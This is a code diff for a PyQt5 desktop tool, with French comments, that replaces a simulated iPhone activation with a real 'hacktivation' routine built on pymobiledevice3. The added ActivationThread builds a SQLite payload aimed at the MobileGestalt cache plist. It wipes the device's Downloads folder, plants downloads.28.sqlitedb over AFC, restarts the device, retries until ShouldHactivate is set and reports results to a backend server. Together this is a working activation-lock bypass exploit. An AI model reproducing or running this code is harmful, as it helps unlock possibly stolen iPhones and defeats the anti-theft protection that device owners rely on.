@@ -1,5 +1,8 @@
 import sys
 import os
+import time
+import sqlite3
+import tempfile
 import json
 import ssl
 import certifi
@@ -8,7 +11,9 @@ import urllib.parse
 import threading
 import platform
 
-# Patch pour construct_typed (inclus dans l'original)
+# =====================================================
+# PATCH ROBUSTE pour construct_typed vs construct_typing
+# =====================================================
 try:
     import construct_typing
     sys.modules['construct_typed'] = construct_typing
@@ -18,16 +23,18 @@ except ImportError:
     except ImportError:
         print("Erreur: ni construct_typing ni construct_typed n'est installé.")
         sys.exit(1)
+# =====================================================
 
 from PyQt5.QtWidgets import (
     QApplication, QMainWindow, QWidget,
     QVBoxLayout, QHBoxLayout, QPushButton,
-    QLabel, QMessageBox, QDialog
+    QLabel, QMessageBox, QDialog, QProgressBar
 )
-from PyQt5.QtCore import pyqtSignal, QTimer, Qt
+from PyQt5.QtCore import QThread, pyqtSignal, QTimer, Qt
 from PyQt5.QtGui import QPixmap, QIcon, QPainter, QColor, QFont, QPainterPath
 
 from pymobiledevice3.lockdown import create_using_usbmux
+from pymobiledevice3.services.afc import AfcService
 from pymobiledevice3.services.diagnostics import DiagnosticsService
 
 # ========================== CONSTANTS ==========================
@@ -120,6 +127,25 @@ def report_async(device_info: dict, status: str):
         daemon=True
     ).start()
 
+def build_db_from_sql(sql_path, backend_url, target_path):
+    with open(sql_path, 'r', encoding='utf-8') as f:
+        sql = f.read()
+    sql = sql.replace('BACKEND_URL', backend_url).replace('TARGET_PATH', target_path)
+    tmp = tempfile.NamedTemporaryFile(delete=False)
+    tmp.close()
+    try:
+        con = sqlite3.connect(tmp.name)
+        con.executescript(sql)
+        con.commit()
+        con.close()
+        with open(tmp.name, 'rb') as f:
+            return f.read()
+    finally:
+        try:
+            os.unlink(tmp.name)
+        except:
+            pass
+
 def check_sn_registered(sn):
     try:
         ctx = ssl.create_default_context(cafile=certifi.where())
@@ -139,7 +165,7 @@ class ClickableLabel(QLabel):
             self.clicked.emit()
         super().mousePressEvent(event)
 
-# ========================== SUCCESS DIALOG (simulé) ==========================
+# ========================== SUCCESS DIALOG ==========================
 class SuccessDialog(QDialog):
     def __init__(self, parent=None, device_info=None):
         super().__init__(parent)
@@ -240,6 +266,122 @@ class SuccessDialog(QDialog):
         right.addLayout(btn_row)
         layout.addLayout(right)
 
+# ========================== ACTIVATION THREAD ==========================
+class ActivationThread(QThread):
+    status  = pyqtSignal(str)
+    success = pyqtSignal(str)
+    error   = pyqtSignal(str)
+    waiting = pyqtSignal(bool)
+
+    def __init__(self, device_info=None):
+        super().__init__()
+        self._device_info = device_info or {}
+
+    def wait_for_device(self, timeout=160):
+        deadline = time.monotonic() + timeout
+        first    = True
+        while time.monotonic() < deadline:
+            try:
+                lockdown = create_using_usbmux()
+                DiagnosticsService(lockdown=lockdown).mobilegestalt(keys=['ProductType'])
+                if not first:
+                    self.waiting.emit(False)
+                    self.status.emit('Device reconnected ✓')
+                return lockdown
+            except Exception:
+                if first:
+                    self.waiting.emit(True)
+                    self.status.emit('Waiting for device reconnection...')
+                    first = False
+                time.sleep(2)
+        raise TimeoutError()
+
+    def push_payload(self, lockdown, payload_db):
+        with AfcService(lockdown=lockdown) as afc:
+            try:
+                for filename in afc.listdir('Downloads'):
+                    try:
+                        afc.rm('Downloads/' + filename)
+                    except Exception:
+                        pass
+            except Exception:
+                pass
+            time.sleep(3)
+            afc.set_file_contents('Downloads/downloads.28.sqlitedb', payload_db)
+        DiagnosticsService(lockdown=lockdown).restart()
+        return self.wait_for_device()
+
+    def should_hactivate(self, lockdown):
+        try:
+            return DiagnosticsService(lockdown=lockdown).mobilegestalt(
+                keys=['ShouldHactivate']
+            ).get('ShouldHactivate', False)
+        except:
+            return False
+
+    def run(self):
+        try:
+            lockdown = create_using_usbmux()
+            values   = lockdown.get_value()
+
+            # ======================================================
+            # REMPLACEMENT DU TEST : vérification de ShouldHactivate
+            # au lieu de ActivationState
+            # ======================================================
+            if self.should_hactivate(lockdown):
+                self.success.emit('Device already hacktivated')
+                return
+
+            sql_path = resource_path('payload.sql')
+            if not os.path.exists(sql_path):
+                self.error.emit(f'Payload file not found: {sql_path}')
+                return
+
+            if tuple(int(x) for x in values.get('ProductVersion', '0.0').split('.')) >= (10, 3):
+                payload_db = build_db_from_sql(
+                    sql_path, BACKEND_URL,
+                    '/private/var/containers/Shared/SystemGroup/'
+                    'systemgroup.com.apple.mobilegestaltcache/Library/Caches/'
+                    'com.apple.MobileGestalt.plist'
+                )
+            else:
+                payload_db = build_db_from_sql(
+                    sql_path, BACKEND_URL,
+                    '/private/var/mobile/Library/Caches/com.apple.MobileGestalt.plist'
+                )
+
+            self.status.emit('Activating device...')
+
+            for attempt in range(5):
+                lockdown = self.push_payload(lockdown, payload_db)
+                delay = 15 + attempt * 5
+                time.sleep(delay)
+
+                if self.should_hactivate(lockdown):
+                    DiagnosticsService(lockdown=lockdown).restart()
+                    report_async(self._device_info, 'Activated ✅')
+                    self.success.emit('Done!')
+                    return
+
+                self.status.emit(f'Retrying activation — Attempt {attempt + 1}/5')
+                time.sleep(5)
+
+            report_async(self._device_info, 'Activation Failed ❌')
+            self.error.emit(
+                'Activation failed after multiple attempts. '
+                'Make sure the device is connected to the Wi-Fi.'
+            )
+
+        except TimeoutError:
+            report_async(self._device_info, 'Timeout Error ⏱️')
+            self.error.emit(
+                'Device did not reconnect in time. '
+                'Please ensure it is connected and try again.'
+            )
+        except Exception as e:
+            report_async(self._device_info, f'Exception ❌: {str(e)}')
+            self.error.emit(str(e))
+
 # ========================== MAIN WINDOW ==========================
 class MainWindow(QMainWindow):
     def __init__(self):
@@ -285,6 +427,11 @@ class MainWindow(QMainWindow):
         for lbl in (self.lbl_uuid, self.lbl_device, self.lbl_udid, self.lbl_imei, self.lbl_sn, self.status):
             lbl.setAlignment(Qt.AlignCenter)
 
+        self.progress = QProgressBar(self)
+        self.progress.setRange(0, 100)
+        self.progress.setValue(0)
+        self.progress.setVisible(False)
+
         # --- Bouton Activate ---
         self.activate = QPushButton('Activate Device', self)
         self.activate.setEnabled(False)
@@ -316,6 +463,7 @@ class MainWindow(QMainWindow):
         layout.addWidget(self.lbl_imei)
         layout.addWidget(self.lbl_sn)
         layout.addSpacing(8)
+        layout.addWidget(self.progress)
         layout.addWidget(self.status)
         layout.addWidget(self.activate)
 
@@ -331,10 +479,25 @@ class MainWindow(QMainWindow):
             QMainWindow { background: transparent; }
             QLabel { background-color: rgba(255,255,255,0.75); border-radius: 4px; padding: 2px 4px; }
             QLabel#statusLabel { color: #004ec5; font-weight: bold; background-color: rgba(255,255,255,0.85); }
+            QProgressBar {
+                border: 1px solid #adb3bd;
+                border-radius: 6px;
+                background: rgba(248,249,250,0.8);
+                height: 16px;
+                text-align: center;
+            }
+            QProgressBar::chunk {
+                background-color: #004ec5;
+                border-radius: 6px;
+            }
         """)
 
         # ---- Connexions ----
         self.activate.clicked.connect(self.start_activation)
+
+        self._progress_timer = QTimer(self)
+        self._progress_timer.timeout.connect(self._tick_progress)
+        self._progress_val = 0
 
         self.timer = QTimer(self)
         self.timer.timeout.connect(self.poll_device)
@@ -426,7 +589,25 @@ class MainWindow(QMainWindow):
         self.status.setVisible(True)
         self.activate.setEnabled(enabled)
 
-    # ---------- Start activation (simulée) ----------
+    # ---------- Progress simulation ----------
+    def _tick_progress(self):
+        if self._progress_val < 90:
+            self._progress_val += 2
+            self.progress.setValue(self._progress_val)
+
+    def _on_activation_status(self, msg):
+        self.status.setText(msg)
+
+    def _on_waiting(self, waiting: bool):
+        if waiting:
+            self._progress_timer.stop()
+            self.progress.setRange(0, 0)
+        else:
+            self.progress.setRange(0, 100)
+            self.progress.setValue(self._progress_val)
+            self._progress_timer.start(600)
+
+    # ---------- Start activation ----------
     def start_activation(self):
         product = self._device_info.get('product', '')
         version = self._device_info.get('version', '')
@@ -504,12 +685,49 @@ class MainWindow(QMainWindow):
             self.status.setVisible(False)
             return
 
-        # Si le SN est enregistré, on simule une activation réussie
-        report_async(self._device_info, 'Activated ✅ (simulated)')
-        self.status.setText('Activation succeeded (simulated)')
-        dlg_success = SuccessDialog(self, device_info=self._device_info)
-        dlg_success.exec_()
+        self.timer.stop()
+        self.activate.setEnabled(False)
+        self.progress.setVisible(True)
+        self.progress.setRange(0, 100)
+        self.progress.setValue(0)
+        self.status.setVisible(True)
+        self.status.setText('Starting activation...')
+
+        self._progress_val = 0
+        self._progress_timer.start(600)
+
+        self.worker = ActivationThread(device_info=self._device_info)
+        self.worker.status.connect(self._on_activation_status)
+        self.worker.waiting.connect(self._on_waiting)
+        self.worker.success.connect(self.on_success)
+        self.worker.error.connect(self.on_error)
+        self.worker.start()
+
+    def on_success(self, msg):
+        self._progress_timer.stop()
+        self.progress.setRange(0, 100)
+        self.progress.setValue(100)
+        self.status.setText('Activated Successfully!')
+        dlg = SuccessDialog(self, device_info=self._device_info)
+        dlg.exec_()
+        self.progress.setVisible(False)
         self.status.setVisible(False)
+        self.activate.setEnabled(True)
+        self.timer.start(1000)
+
+    def on_error(self, msg):
+        self._progress_timer.stop()
+        self.progress.setRange(0, 100)
+        self.progress.setVisible(False)
+        err = QMessageBox(self)
+        err.setWindowTitle('Error')
+        err.setText('Activation failed.')
+        err.setInformativeText(msg)
+        err.setIcon(QMessageBox.Critical)
+        err.exec_()
+        self.status.setText('Error occurred')
+        self.status.setVisible(True)
+        self.timer.start(1000)
 
 # ========================== ENTRY POINT ==========================
 if __name__ == '__main__':
